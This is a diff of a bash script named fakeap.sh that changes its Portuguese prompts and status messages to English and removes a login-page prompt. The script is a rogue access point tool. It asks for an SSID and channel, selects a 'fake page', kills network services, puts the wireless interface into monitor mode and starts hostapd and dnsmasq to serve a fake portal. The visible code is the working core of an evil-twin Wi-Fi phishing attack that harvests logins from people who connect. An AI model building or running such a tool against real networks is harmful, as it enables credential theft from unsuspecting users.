@@ -89,18 +89,16 @@ start() {
     let counter++
   done
 
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface a ser usada:\e[0m ' use_interface
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface to use:\e[0m ' use_interface
   choosed_interface=$(sed ''$use_interface'q;d' iface)
   IFS=$'\n'
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID a ser usado:\e[0m ' use_ssid
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Canal a ser usado:\e[0m ' use_channel
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Página de login (Padrão: login.php):\e[0m ' login_page
-  login_page="${login_page:-login.php}"
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID to use:\e[0m ' use_ssid
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Channel to use:\e[0m ' use_channel
   list_folders
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Número da página falsa a ser usada:\e[0m ' fake_page_number
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Fake page number to use:\e[0m ' fake_page_number
   fake_page=$(sed ''$fake_page_number'q;d' folders)
   createpage
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Encerrando todas as conexões..\e[0m\n" 
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Killing all connections..\e[0m\n" 
   sleep 2
   killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
   sleep 5
@@ -112,13 +110,13 @@ start() {
   printf "macaddr_acl=0\n" >> hostapd.conf
   printf "auth_algs=1\n" >> hostapd.conf
   printf "ignore_broadcast_ssid=0\n" >> hostapd.conf
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s desativada\n" $choosed_interface 
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" $choosed_interface 
   ifconfig $choosed_interface down
   sleep 4
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando %s para o modo monitor\e[0m\n" $choosed_interface
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Setting %s to monitor mode\n" $choosed_interface
   iwconfig $choosed_interface mode monitor
   sleep 4
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s ativada\e[0m\n" $choosed_interface 
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Up\n" $choosed_interface 
   ifconfig wlan0 up
   sleep 5
   hostapd hostapd.conf > /dev/null 2>&1 &
@@ -138,7 +136,7 @@ start() {
   sleep 1
   dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
   sleep 5
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para Parar: ./fakeap.sh --stop\e[0m\n"
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] To Stop: ./fakeap.sh --stop\n"
   server
 }
 
